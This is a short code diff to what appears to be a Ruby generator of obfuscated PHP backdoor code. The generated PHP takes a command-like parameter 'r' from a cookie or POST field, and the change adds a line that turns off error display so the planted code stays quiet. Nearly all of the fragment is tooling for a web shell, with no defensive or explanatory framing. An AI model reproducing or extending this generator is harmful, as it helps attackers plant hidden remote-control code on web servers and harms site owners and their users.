@@ -99,7 +99,7 @@ end
 ivp=Digest::MD5.hexdigest(ivp)
 
 ivpra=ivp
-out="<?php if (isset($_COOKIE[\"r\"])) { $_POST[\"r\"]=$_COOKIE[\"r\"]; } if (isset($_POST[\"r\"])) { "
+out="<?php ini_set('display_errors', 0); if (isset($_COOKIE[\"r\"])) { $_POST[\"r\"]=$_COOKIE[\"r\"]; } if (isset($_POST[\"r\"])) { "
 
 chars=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 'r', 't', 'u', 'v', 'w', 'x', 'y', 'z']
 ivp=""
